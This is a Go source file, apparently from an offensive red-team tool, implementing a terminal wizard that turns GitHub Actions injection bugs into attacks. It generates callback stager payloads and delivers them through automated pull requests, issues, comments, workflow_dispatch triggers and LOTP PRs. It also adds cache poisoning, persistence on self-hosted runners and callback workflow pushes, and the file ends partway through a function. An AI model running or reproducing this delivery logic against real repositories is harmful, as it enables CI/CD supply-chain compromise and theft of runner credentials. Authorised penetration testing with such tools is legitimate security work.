// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	tea "charm.land/bubbletea/v2"

	"github.com/boostsecurityio/smokedmeat/internal/lotp"
	"github.com/boostsecurityio/smokedmeat/internal/rye"
)

var runnerTargetStaticLabelPattern = regexp.MustCompile(`^[A-Za-z0-9_.-]+$`)

func prependGateTriggers(payload string, vuln *Vulnerability) string {
	if vuln == nil || len(vuln.GateTriggers) == 0 {
		return payload
	}
	prefix := strings.Join(vuln.GateTriggers, " ")
	return prefix + " " + payload
}

func cycleWizardCallbackBudget(current int) int {
	budgets := []int{1, 2, 3, 5}
	if current <= 0 {
		return budgets[0]
	}
	for i, budget := range budgets {
		if budget == current {
			return budgets[(i+1)%len(budgets)]
		}
	}
	return budgets[0]
}

func isPureWorkflowDispatchVuln(vuln *Vulnerability) bool {
	if vuln == nil {
		return false
	}
	if strings.TrimSpace(vuln.RuleID) == "workflow_dispatch" {
		return true
	}
	return strings.TrimSpace(vuln.Context) == "workflow_dispatch" && len(vuln.InjectionSources) == 0
}

func (m *Model) cycleWizardCallbackBudget() {
	if m.wizard == nil || m.wizard.Step != 3 || m.wizard.CachePoisonEnabled {
		return
	}
	m.wizard.CallbackBudget = cycleWizardCallbackBudget(m.wizard.CallbackBudget)
}

func wizardDeploymentModeLabel(w *WizardState) string {
	if w == nil {
		return "express"
	}
	parts := []string{"express"}
	if w.DwellTime > 0 {
		parts[0] = fmt.Sprintf("dwell %s", w.DwellTime)
	}
	if w.CallbackBudget > 1 {
		parts = append(parts, fmt.Sprintf("%d callbacks", w.CallbackBudget))
	}
	return strings.Join(parts, ", ")
}

const (
	persistenceEnvKey                   = "SMOKEDMEAT_PERSIST"
	runnerTargetMetadataKindKey         = "callback_kind"
	runnerTargetMetadataKindValue       = "self_hosted_runner"
	runnerTargetMetadataModeKey         = "persistence_mode"
	runnerTargetMetadataModeResident    = "resident"
	runnerTargetMetadataRetryKey        = "retry_policy"
	runnerTargetMetadataRouteKey        = "deploy_route"
	runnerTargetMetadataBranchKey       = "branch"
	runnerTargetMetadataWorkflowFileKey = "workflow_file"
	runnerTargetMetadataTriggerKey      = "workflow_trigger"
)

func runnerTargetUsesTryCloudflare(rawURL string) bool {
	parsed, err := url.Parse(strings.TrimSpace(rawURL))
	if err != nil {
		return false
	}
	host := strings.TrimSpace(parsed.Hostname())
	return strings.HasSuffix(host, ".trycloudflare.com")
}

func runnerTargetRetryPolicy(rawURL string) string {
	if runnerTargetUsesTryCloudflare(rawURL) {
		return "trycloudflare-1h"
	}
	return "infinite"
}

func decoratePayloadForPersistence(payload string) string {
	if strings.Contains(payload, "${IFS}") {
		return strings.ReplaceAll(payload, "|bash", "|"+persistenceEnvKey+"=1${IFS}bash")
	}
	return strings.ReplaceAll(payload, "|bash", "|"+persistenceEnvKey+"=1 bash")
}

func (m Model) wizardCanAttemptPersistence() bool {
	if m.wizard == nil {
		return false
	}
	if m.wizard.Kind == WizardKindRunnerTarget {
		return m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow
	}
	return m.vulnerabilityCanAttemptPersistence(m.wizard.SelectedVuln)
}

func (m Model) vulnerabilityCanAttemptPersistence(vuln *Vulnerability) bool {
	if vuln == nil || m.selfHostedContextForVulnerability(vuln) == nil {
		return false
	}
	if len(vuln.GateTriggers) > 0 {
		return false
	}
	if vulnerabilitySupportsLOTPPersistence(vuln) {
		return true
	}
	injCtx, ok := payloadInjectionContextForVuln(vuln)
	if !ok {
		return false
	}
	return injCtx.Language == rye.LangBash
}

func vulnerabilitySupportsLOTPPersistence(vuln *Vulnerability) bool {
	if vuln == nil || vuln.RuleID != "untrusted_checkout_exec" {
		return false
	}
	status := lotp.AutoDeployStatusFor(vuln.LOTPTool, vuln.LOTPAction)
	return status.Supported
}

func (m *Model) toggleWizardPersistenceAttempt() {
	if m.wizard == nil || !m.wizardCanAttemptPersistence() {
		return
	}
	m.wizard.PersistenceAttempt = !m.wizard.PersistenceAttempt
	m.wizard.Payload = ""
}

func (m *Model) cycleCommentTarget() {
	if m.wizard == nil {
		return
	}
	targets := m.availableCommentTargets()
	if len(targets) == 0 {
		return
	}
	for i, target := range targets {
		if target == m.wizard.CommentTarget {
			m.wizard.CommentTarget = targets[(i+1)%len(targets)]
			if m.wizard.CommentTarget == CommentTargetStubPullRequest {
				m.wizardInput.SetValue("")
				m.wizardInput.Blur()
				return
			}
			m.wizardInput.Focus()
			return
		}
	}
	m.wizard.CommentTarget = targets[0]
	if m.wizard.CommentTarget == CommentTargetStubPullRequest {
		m.wizardInput.SetValue("")
		m.wizardInput.Blur()
		return
	}
	m.wizardInput.Focus()
}

func (m *Model) normalizeCommentTarget() {
	if m.wizard == nil {
		return
	}
	targets := m.availableCommentTargets()
	if len(targets) == 0 {
		return
	}
	for _, target := range targets {
		if target == m.wizard.CommentTarget {
			return
		}
	}
	m.wizard.CommentTarget = targets[0]
	if m.wizard.CommentTarget == CommentTargetStubPullRequest {
		m.wizardInput.SetValue("")
		m.wizardInput.Blur()
		return
	}
	m.wizardInput.Focus()
}

func (m *Model) setWizardDeliveryMethod(method DeliveryMethod) bool {
	if m.wizard == nil {
		return false
	}
	state, _ := m.deliveryMethodStatus(method)
	if state == deployStateFail || state == deployStateDenied {
		return false
	}
	m.wizard.DeliveryMethod = method
	return true
}

func (m *Model) moveWizardDelivery(delta int) {
	if m.wizard == nil || m.wizard.Step != 2 || delta == 0 {
		return
	}
	methods := ApplicableDeliveryMethods(m.wizard.SelectedVuln)
	if len(methods) == 0 {
		return
	}
	currentIdx := 0
	for i, method := range methods {
		if m.wizard.DeliveryMethod == method {
			currentIdx = i
			break
		}
	}
	for nextIdx := currentIdx + delta; nextIdx >= 0 && nextIdx < len(methods); nextIdx += delta {
		if m.setWizardDeliveryMethod(methods[nextIdx]) {
			return
		}
	}
}

func (m *Model) setRunnerTargetAction(action RunnerTargetAction) {
	if m.wizard == nil {
		return
	}
	m.wizard.RunnerTargetAction = action
}

func (m *Model) moveRunnerTargetAction(delta int) {
	if m.wizard == nil || m.wizard.Step != 2 || delta == 0 {
		return
	}
	actions := []RunnerTargetAction{
		RunnerTargetActionPassiveDetails,
		RunnerTargetActionAutoWorkflowPush,
		RunnerTargetActionCopyWorkflow,
	}
	currentIdx := 0
	for i, action := range actions {
		if m.wizard.RunnerTargetAction == action {
			currentIdx = i
			break
		}
	}
	nextIdx := currentIdx + delta
	if nextIdx < 0 || nextIdx >= len(actions) {
		return
	}
	m.wizard.RunnerTargetAction = actions[nextIdx]
}

func (m Model) handleRunnerTargetWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
	switch msg.String() {
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit
	case "esc":
		if m.wizard.Step <= 1 {
			m.CloseWizard()
		} else {
			m.wizard.Step--
		}
		return m, nil
	case "enter":
		return m.advanceRunnerTargetWizardStep()
	case "1":
		if m.wizard.Step == 2 {
			m.setRunnerTargetAction(RunnerTargetActionPassiveDetails)
		}
		return m, m.startWizardPreflight(false)
	case "2":
		if m.wizard.Step == 2 {
			m.setRunnerTargetAction(RunnerTargetActionAutoWorkflowPush)
		}
		return m, m.startWizardPreflight(false)
	case "3":
		if m.wizard.Step == 2 {
			m.setRunnerTargetAction(RunnerTargetActionCopyWorkflow)
		}
		return m, m.startWizardPreflight(false)
	case "up", "k":
		if m.wizard.Step == 2 {
			m.moveRunnerTargetAction(-1)
		}
		return m, m.startWizardPreflight(false)
	case "down", "j":
		if m.wizard.Step == 2 {
			m.moveRunnerTargetAction(1)
		}
		return m, m.startWizardPreflight(false)
	case "d":
		if m.wizard.Step == 3 &&
			(m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow) &&
			!m.wizard.PersistenceAttempt {
			dwellPresets := []time.Duration{0, 30 * time.Second, 60 * time.Second, 2 * time.Minute, 5 * time.Minute}
			currentIdx := 0
			for i, d := range dwellPresets {
				if d == m.wizard.DwellTime {
					currentIdx = i
					break
				}
			}
			m.wizard.DwellTime = dwellPresets[(currentIdx+1)%len(dwellPresets)]
		}
		return m, nil
	case "b":
		if m.wizard.Step == 3 &&
			(m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow) &&
			!m.wizard.PersistenceAttempt {
			m.cycleWizardCallbackBudget()
		}
		return m, nil
	case "p":
		if m.wizard.Step == 3 && (m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow) {
			m.toggleWizardPersistenceAttempt()
		}
		return m, nil
	}

	return m, nil
}

func (m Model) handleWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
	if m.wizard == nil {
		m.CloseWizard()
		return m, nil
	}
	if m.wizard.Kind == WizardKindRunnerTarget {
		return m.handleRunnerTargetWizardKeyMsg(msg)
	}
	if m.wizard.Kind == WizardKindWorkflowDispatch {
		return m.handleWorkflowDispatchWizardKeyMsg(msg)
	}

	if m.wizard.Step == 3 && m.wizard.DeliveryMethod == DeliveryComment {
		m.normalizeCommentTarget()
		switch msg.String() {
		case "ctrl+c":
			m.quitting = true
			return m, tea.Quit
		case "esc":
			m.wizard.Step--
			return m, nil
		case "enter":
			return m.advanceWizardStep()
		case "d":
			dwellPresets := []time.Duration{0, 30 * time.Second, 60 * time.Second, 2 * time.Minute, 5 * time.Minute}
			currentIdx := 0
			for i, d := range dwellPresets {
				if d == m.wizard.DwellTime {
					currentIdx = i
					break
				}
			}
			m.wizard.DwellTime = dwellPresets[(currentIdx+1)%len(dwellPresets)]
			return m, nil
		case "b":
			m.cycleWizardCallbackBudget()
			return m, nil
		case "p":
			m.toggleWizardPersistenceAttempt()
			return m, nil
		case "t":
			m.cycleCommentTarget()
			return m, m.startWizardPreflight(false)
		case "a":
			if m.wizard.CommentTarget == CommentTargetStubPullRequest {
				if m.wizard.AutoClose == nil {
					m.wizard.AutoClose = boolPtr(false)
				} else {
					m.wizard.AutoClose = boolPtr(!*m.wizard.AutoClose)
				}
			}
			return m, nil
		case "c":
			if available, _ := m.cachePoisonAvailability(m.wizard.SelectedVuln); available {
				m.wizard.CachePoisonEnabled = !m.wizard.CachePoisonEnabled
				if m.wizard.CachePoisonEnabled && m.wizard.CachePoisonVictimIndex >= len(readyCachePoisonVictims(m.wizard.SelectedVuln.CachePoisonVictims)) {
					m.wizard.CachePoisonVictimIndex = 0
				}
				if !m.wizard.CachePoisonEnabled {
					m.wizard.CachePoisonReplace = false
				}
			}
			return m, nil
		case "r":
			if m.wizard.CachePoisonEnabled && m.activeTokenAllowsCacheReplacement() {
				m.wizard.CachePoisonReplace = !m.wizard.CachePoisonReplace
			}
			return m, nil
		case "v":
			if m.wizard.CachePoisonEnabled {
				m.cycleCachePoisonVictim()
			}
			return m, nil
		default:
			if m.wizard.CommentTarget == CommentTargetStubPullRequest {
				return m, nil
			}
			prevIssue := m.currentCommentIssueNumber()
			prevPR := m.currentCommentPRNumber()
			var cmd tea.Cmd
			m.wizardInput, cmd = m.wizardInput.Update(msg)
			if prevIssue != m.currentCommentIssueNumber() || prevPR != m.currentCommentPRNumber() {
				return m, tea.Batch(cmd, m.startWizardPreflight(false))
			}
			return m, cmd
		}
	}

	switch msg.String() {
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit

	case "esc":
		if m.wizard.Step <= 1 {
			m.CloseWizard()
		} else {
			m.wizard.Step--
		}
		return m, nil

	case "enter":
		return m.advanceWizardStep()

	case "1", "2", "3", "4", "5":
		if m.wizard.Step == 2 {
			idx := int(msg.String()[0] - '1')
			methods := ApplicableDeliveryMethods(m.wizard.SelectedVuln)
			if idx < len(methods) {
				m.setWizardDeliveryMethod(methods[idx])
			}
		}
		return m, m.startWizardPreflight(false)

	case "up", "k":
		if m.wizard.Step == 2 {
			m.moveWizardDelivery(-1)
		}
		return m, m.startWizardPreflight(false)

	case "down", "j":
		if m.wizard.Step == 2 {
			m.moveWizardDelivery(1)
		}
		return m, m.startWizardPreflight(false)

	case "d":
		if m.wizard.Step == 3 {
			dwellPresets := []time.Duration{0, 30 * time.Second, 60 * time.Second, 2 * time.Minute, 5 * time.Minute}
			currentIdx := 0
			for i, d := range dwellPresets {
				if d == m.wizard.DwellTime {
					currentIdx = i
					break
				}
			}
			m.wizard.DwellTime = dwellPresets[(currentIdx+1)%len(dwellPresets)]
		}
		return m, nil

	case "b":
		m.cycleWizardCallbackBudget()
		return m, nil

	case "p":
		if m.wizard.Step == 3 {
			m.toggleWizardPersistenceAttempt()
		}
		return m, nil

	case "f":
		if m.wizard.Step == 3 && m.wizard.DeliveryMethod == DeliveryAutoPR {
			if m.wizard.Draft == nil {
				m.wizard.Draft = boolPtr(false)
			} else {
				m.wizard.Draft = boolPtr(!*m.wizard.Draft)
			}
		}
		return m, nil

	case "a":
		if m.wizard.Step == 3 && (m.wizard.DeliveryMethod == DeliveryAutoPR || m.wizard.DeliveryMethod == DeliveryIssue) {
			if m.wizard.AutoClose == nil {
				m.wizard.AutoClose = boolPtr(false)
			} else {
				m.wizard.AutoClose = boolPtr(!*m.wizard.AutoClose)
			}
		}
		return m, nil

	case "c":
		if m.wizard.Step == 3 {
			if available, _ := m.cachePoisonAvailability(m.wizard.SelectedVuln); available {
				m.wizard.CachePoisonEnabled = !m.wizard.CachePoisonEnabled
				if m.wizard.CachePoisonEnabled && m.wizard.CachePoisonVictimIndex >= len(readyCachePoisonVictims(m.wizard.SelectedVuln.CachePoisonVictims)) {
					m.wizard.CachePoisonVictimIndex = 0
				}
				if !m.wizard.CachePoisonEnabled {
					m.wizard.CachePoisonReplace = false
				}
			}
		}
		return m, nil

	case "r":
		if m.wizard.Step == 3 && m.wizard.CachePoisonEnabled && m.activeTokenAllowsCacheReplacement() {
			m.wizard.CachePoisonReplace = !m.wizard.CachePoisonReplace
		}
		return m, nil

	case "v":
		if m.wizard.Step == 3 {
			m.cycleCachePoisonVictim()
		}
		return m, nil
	}

	return m, nil
}

func (m Model) handleWorkflowDispatchWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
	if m.wizard == nil || m.wizard.SelectedDispatch == nil {
		m.CloseWizard()
		return m, nil
	}
	target := m.wizard.SelectedDispatch
	saveCurrent := func() {
		if len(target.Inputs) == 0 {
			return
		}
		if target.Cursor < 0 {
			target.Cursor = 0
		}
		if target.Cursor >= len(target.Inputs) {
			target.Cursor = len(target.Inputs) - 1
		}
		target.Values[target.Inputs[target.Cursor].Name] = m.wizardInput.Value()
	}
	loadCurrent := func() {
		if len(target.Inputs) == 0 {
			return
		}
		m.wizardInput.SetValue(target.Values[target.Inputs[target.Cursor].Name])
		m.wizardInput.Focus()
	}

	switch msg.String() {
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit
	case "esc":
		m.CloseWizard()
		return m, nil
	case "enter":
		saveCurrent()
		if err := validateWorkflowDispatchInputs(target); err != nil {
			m.AddOutput("error", err.Error())
			return m, nil
		}
		return m.executeWorkflowDispatchWizardAction()
	case "up", "k":
		saveCurrent()
		if target.Cursor > 0 {
			target.Cursor--
			loadCurrent()
		}
		return m, nil
	case "down", "j":
		saveCurrent()
		if target.Cursor+1 < len(target.Inputs) {
			target.Cursor++
			loadCurrent()
		}
		return m, nil
	case "left", "h", "right", "l":
		saveCurrent()
		if len(target.Inputs) > 0 {
			input := target.Inputs[target.Cursor]
			values := input.Options
			if input.Type == "boolean" && len(values) == 0 {
				values = []string{"false", "true"}
			}
			if len(values) > 0 {
				current := target.Values[input.Name]
				idx := 0
				for i, value := range values {
					if value == current {
						idx = i
						break
					}
				}
				if msg.String() == "left" || msg.String() == "h" {
					idx = (idx - 1 + len(values)) % len(values)
				} else {
					idx = (idx + 1) % len(values)
				}
				target.Values[input.Name] = values[idx]
				loadCurrent()
			}
		}
		return m, nil
	default:
		if len(target.Inputs) == 0 {
			return m, nil
		}
		input := target.Inputs[target.Cursor]
		if input.Type == "choice" && len(input.Options) > 0 {
			return m, nil
		}
		var cmd tea.Cmd
		m.wizardInput, cmd = m.wizardInput.Update(msg)
		target.Values[input.Name] = m.wizardInput.Value()
		return m, cmd
	}
}

func (m Model) executeWorkflowDispatchWizardAction() (tea.Model, tea.Cmd) {
	if m.wizard == nil || m.wizard.SelectedDispatch == nil {
		m.CloseWizard()
		return m, nil
	}
	dispatchToken := m.dispatchCredential()
	if dispatchToken == nil {
		m.AddOutput("error", "No token with workflow_dispatch permission is ready")
		m.AddOutput("info", "Use a live GITHUB_TOKEN, App token, or PAT with repo/actions:write")
		m.CloseWizard()
		return m, nil
	}
	target := *m.wizard.SelectedDispatch
	inputs := workflowDispatchInputPayload(&target)
	m.AddOutput("info", fmt.Sprintf("Triggering workflow_dispatch on %s %s with %s...", target.Repository, target.Workflow, dispatchToken.Name))
	m.activityLog.Add(IconInfo, "Triggering workflow_dispatch")
	m.CloseWizard()
	return m, m.deployWorkflowDispatch(target, "", dispatchToken, inputs, 0)
}

func (m Model) advanceWizardStep() (tea.Model, tea.Cmd) {
	if m.wizard == nil {
		return m, nil
	}
	if m.wizard.Kind == WizardKindRunnerTarget {
		return m.advanceRunnerTargetWizardStep()
	}

	switch m.wizard.Step {
	case 1:
		m.wizard.Step = 2
		return m, nil

	case 2:
		state, reason := m.deliveryMethodStatus(m.wizard.DeliveryMethod)
		if state == deployStateFail || state == deployStateDenied {
			if reason == "" {
				reason = "Selected delivery path is unavailable"
			}
			m.AddOutput("error", reason)
			return m, nil
		}
		if m.wizard.DeliveryMethod == DeliveryCopyOnly ||
			m.wizard.DeliveryMethod == DeliveryManualSteps {
			vuln := m.wizard.SelectedVuln
			if vuln != nil {
				injCtx, ok := payloadInjectionContextForVuln(vuln)
				if !ok {
					injCtx = rye.BashRun
				}
				stager := rye.NewStager(m.config.ExternalURL(), injCtx)
				payloadObj := stager.Generate()
				payload := prependGateTriggers(payloadObj.Raw, vuln)
				if m.wizard.PersistenceAttempt {
					payload = decoratePayloadForPersistence(payload)
				}
				m.wizard.StagerID = stager.ID
				m.wizard.Payload = payload
			}
		}
		if m.wizard.DeliveryMethod == DeliveryComment {
			m.wizardInput.SetValue("")
			m.wizardInput.Focus()
			m.wizard.CommentTarget = CommentTargetIssue
		}
		m.wizard.Step = 3
		return m, m.startWizardPreflight(false)

	case 3:
		return m.executeWizardDeployment()
	}

	return m, nil
}

func (m Model) advanceRunnerTargetWizardStep() (tea.Model, tea.Cmd) {
	if m.wizard == nil || m.wizard.SelectedRunnerTarget == nil {
		m.CloseWizard()
		return m, nil
	}

	switch m.wizard.Step {
	case 1:
		m.wizard.Step = 2
		return m, m.startWizardPreflight(false)
	case 2:
		m.wizard.Step = 3
		return m, nil
	case 3:
		return m.executeRunnerTargetWizardAction()
	}

	return m, nil
}

func (m Model) executeWizardDeployment() (tea.Model, tea.Cmd) {
	if m.wizard == nil || m.wizard.SelectedVuln == nil {
		m.CloseWizard()
		return m, nil
	}

	vuln := m.wizard.SelectedVuln
	m.pendingCachePoison = nil
	if reason := deliveryMethodBlockReason(vuln, m.wizard.DeliveryMethod); reason != "" {
		m.AddOutput("error", reason)
		return m, nil
	}
	state, reason := m.wizardPreflightBlockForMethod(m.wizard.DeliveryMethod)
	if state != "" {
		if reason == "" {
			reason = "Selected delivery path is blocked"
		}
		m.AddOutput("error", reason)
		return m, nil
	}

	switch m.wizard.DeliveryMethod {
	case DeliveryAutoPR:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for Auto PR")
			m.CloseWizard()
			return m, nil
		}

		injCtx, ok := payloadInjectionContextForVuln(vuln)
		if !ok {
			injCtx = rye.PRBody
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		dwellTime := m.wizard.DwellTime
		dwellInfo := wizardDeploymentModeLabel(m.wizard)
		m.AddOutput("info", fmt.Sprintf("Creating PR for %s (%s)...", vuln.ID, dwellInfo))
		m.activityLog.Add(IconInfo, "Deploying payload via Auto PR")
		draft := m.wizard.Draft
		autoClose := m.wizard.AutoClose
		m.CloseWizard()
		return m, m.deployAutoPR(vuln, stager.ID, payload, dwellTime, draft, autoClose)

	case DeliveryIssue:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for Issue creation")
			m.CloseWizard()
			return m, nil
		}

		injCtx, ok := payloadInjectionContextForVuln(vuln)
		if !ok {
			injCtx = rye.PRBody
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		dwellTime := m.wizard.DwellTime
		dwellInfo := wizardDeploymentModeLabel(m.wizard)
		m.AddOutput("info", fmt.Sprintf("Creating Issue for %s (%s)...", vuln.ID, dwellInfo))
		m.activityLog.Add(IconInfo, "Deploying payload via Issue")
		autoClose := m.wizard.AutoClose
		m.CloseWizard()
		return m, m.deployIssue(vuln, stager.ID, payload, dwellTime, autoClose)

	case DeliveryComment:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for Comment creation")
			m.CloseWizard()
			return m, nil
		}
		state, reason := m.wizardPreflightBlockForCommentTarget(m.wizard.CommentTarget)
		if state != "" {
			if reason == "" {
				reason = "Current comment target is blocked"
			}
			m.AddOutput("error", reason)
			return m, nil
		}

		issueNum := 0
		if m.wizard.CommentTarget != CommentTargetStubPullRequest && m.wizardInput.Value() != "" {
			val := m.wizardInput.Value()
			if n, err := strconv.Atoi(val); err == nil && n > 0 {
				issueNum = n
			} else {
				m.AddOutput("error", "Invalid issue/PR number - must be a positive integer")
				return m, nil
			}
		}
		m.wizard.IssueNumber = issueNum

		injCtx, ok := payloadInjectionContextForVuln(vuln)
		if !ok {
			injCtx = rye.PRBody
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		dwellTime := m.wizard.DwellTime
		dwellInfo := wizardDeploymentModeLabel(m.wizard)
		switch m.wizard.CommentTarget {
		case CommentTargetPullRequest:
			if issueNum > 0 {
				m.AddOutput("info", fmt.Sprintf("Adding Comment to PR #%d for %s (%s)...", issueNum, vuln.ID, dwellInfo))
			} else {
				m.AddOutput("error", "PR number required for existing PR comment deployment")
				return m, nil
			}
		case CommentTargetStubPullRequest:
			m.AddOutput("info", fmt.Sprintf("Creating stub PR and adding Comment for %s (%s)...", vuln.ID, dwellInfo))
		default:
			if issueNum > 0 {
				m.AddOutput("info", fmt.Sprintf("Adding Comment to issue #%d for %s (%s)...", issueNum, vuln.ID, dwellInfo))
			} else {
				m.AddOutput("info", fmt.Sprintf("Adding Comment for %s (%s)...", vuln.ID, dwellInfo))
			}
		}
		m.activityLog.Add(IconInfo, "Deploying payload via Comment")
		target := m.wizard.CommentTarget
		autoClose := m.wizard.AutoClose
		m.CloseWizard()
		return m, m.deployComment(vuln, stager.ID, payload, issueNum, dwellTime, target, autoClose)

	case DeliveryLOTP:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for LOTP deployment")
			m.CloseWizard()
			return m, nil
		}

		stager, _, err := m.prepareWizardStager(vuln, rye.BashRun)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		dwellTime := m.wizard.DwellTime

		m.AddOutput("info", fmt.Sprintf("Creating LOTP PR for %s...", vuln.Repository))
		var lotpLabel string
		switch {
		case vuln.LOTPTool != "":
			lotpLabel = vuln.LOTPTool + " (tool)"
		case vuln.LOTPAction != "":
			lotpLabel = vuln.LOTPAction + " (action)"
		}
		m.activityLog.Add(IconInfo, fmt.Sprintf("Deploying %s LOTP payload", lotpLabel))
		m.CloseWizard()
		return m, m.deployLOTP(vuln, stager.ID, dwellTime)

	case DeliveryCopyOnly:
		injCtx, ok := payloadInjectionContextForVuln(vuln)
		if !ok {
			injCtx = rye.BashRun
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("warning", fmt.Sprintf("Stager registration failed: %v", err))
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		if err := clipboardWriteAll(payload); err != nil {
			m.AddOutput("warning", fmt.Sprintf("Clipboard failed: %v", err))
			m.AddOutput("info", "Payload displayed below - copy manually:")
		} else {
			m.AddOutput("success", "══════════════════════════════════════")
			m.AddOutput("success", "  ✓ PAYLOAD COPIED TO CLIPBOARD")
			m.AddOutput("success", "══════════════════════════════════════")
			m.activityLog.Add(IconSuccess, "Payload copied to clipboard")
		}

		dwellInfo := wizardDeploymentModeLabel(m.wizard)

		m.AddOutput("info", "")
		m.AddOutput("output", payload)
		m.AddOutput("info", "")
		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Mode: %s | Callback: %s", stager.ID, dwellInfo, stager.CallbackURL()))

		m.pendingCachePoison = nil
		m.CloseWizard()
		return m, nil

	case DeliveryManualSteps:
		payload := m.wizard.Payload
		if payload == "" {
			injCtx, ok := payloadInjectionContextForVuln(vuln)
			if !ok {
				injCtx = rye.BashRun
			}
			stager, preparedPayload, err := m.prepareWizardStager(vuln, injCtx)
			if err != nil {
				m.AddOutput("warning", fmt.Sprintf("Stager registration failed: %v", err))
			}
			payload = preparedPayload
			m.wizard.StagerID = stager.ID
			m.wizard.Payload = payload
		}
		m.wizard.Payload = payload

		if err := clipboardWriteAll(payload); err == nil {
			m.AddOutput("success", "══════════════════════════════════════")
			m.AddOutput("success", "  ✓ PAYLOAD COPIED TO CLIPBOARD")
			m.AddOutput("success", "══════════════════════════════════════")
			m.activityLog.Add(IconSuccess, "Payload copied to clipboard")
		}

		dwellInfo := wizardDeploymentModeLabel(m.wizard)

		m.AddOutput("info", "")
		m.AddOutput("info", fmt.Sprintf("Target: %s", vuln.Repository))
		m.AddOutput("info", "")
		m.AddOutput("output", payload)
		m.AddOutput("info", "")
		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Mode: %s", m.wizard.StagerID, dwellInfo))
		m.pendingCachePoison = nil
		m.CloseWizard()
		return m, nil

	case DeliveryAutoDispatch:
		dispatchToken := m.dispatchCredential()
		if dispatchToken == nil {
			m.AddOutput("error", "No token with workflow_dispatch permission is ready")
			m.AddOutput("info", "Use a live GITHUB_TOKEN, App token, or PAT with repo/actions:write")
			m.CloseWizard()
			return m, nil
		}

		injCtx, ok := payloadInjectionContextForVuln(vuln)
		if !ok {
			injCtx = rye.BashRun
		}

		stagerID := ""
		payload := ""
		inputName := ""
		if !isPureWorkflowDispatchVuln(vuln) {
			stager, payloadValue, err := m.prepareWizardStager(vuln, injCtx)
			if err != nil {
				m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
				m.CloseWizard()
				return m, nil
			}
			stagerID = stager.ID
			payload = payloadValue
			m.wizard.StagerID = stager.ID
			m.wizard.Payload = payloadValue

			inputName = extractDispatchInputName(vuln.InjectionSources)
			if inputName == "" {
				inputName = "payload"
			}
		}

		dwellTime := m.wizard.DwellTime
		dwellInfo := wizardDeploymentModeLabel(m.wizard)

		m.AddOutput("info", fmt.Sprintf("Triggering workflow_dispatch with %s (%s)...", dispatchToken.Name, dwellInfo))
		m.activityLog.Add(IconInfo, "Triggering workflow_dispatch pivot")
		m.CloseWizard()
		return m, m.deployAutoDispatch(vuln, stagerID, payload, dispatchToken, inputName, dwellTime)
	}

	m.CloseWizard()
	return m, nil
}

func (m Model) executeRunnerTargetWizardAction() (tea.Model, tea.Cmd) {
	if m.wizard == nil || m.wizard.SelectedRunnerTarget == nil {
		m.CloseWizard()
		return m, nil
	}

	target := m.wizard.SelectedRunnerTarget
	switch m.wizard.RunnerTargetAction {
	case RunnerTargetActionPassiveDetails:
		m.AddOutput("info", fmt.Sprintf("Observed self-hosted runner target %s on %s", target.LabelDisplay, target.Repository))
		if target.PreferredPath != "" {
			m.AddOutput("info", fmt.Sprintf("Prefer existing vuln-backed path first: %s", target.PreferredPath))
		}
		m.CloseWizard()
		return m, nil
	case RunnerTargetActionAutoWorkflowPush:
		state, reason := m.runnerTargetActionStatus(m.wizard.RunnerTargetAction)
		if state == deployStateFail || state == deployStateDenied {
			if reason == "" {
				reason = "Runner-target auto workflow push is blocked"
			}
			m.AddOutput("error", reason)
			return m, nil
		}
		if err := validateRunnerTargetWorkflowLabels(target); err != nil {
			m.AddOutput("error", err.Error())
			return m, nil
		}
		workflowPath := runnerTargetWorkflowPath()
		branchName := generateRunnerTargetBranchName(time.Now())
		deployRoute := "token"
		var sshState *SSHState
		if m.runnerTargetSSHWriteResult() != nil {
			sshState = m.sshState
			deployRoute = "ssh"
		}
		stager, script, err := m.prepareRunnerTargetPayload(target, m.runnerTargetCallbackMetadata(target, workflowPath, branchName, deployRoute))
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}
		workflowYAML := buildRunnerTargetCallbackWorkflow(target, script)
		modeLabel := wizardDeploymentModeLabel(m.wizard)
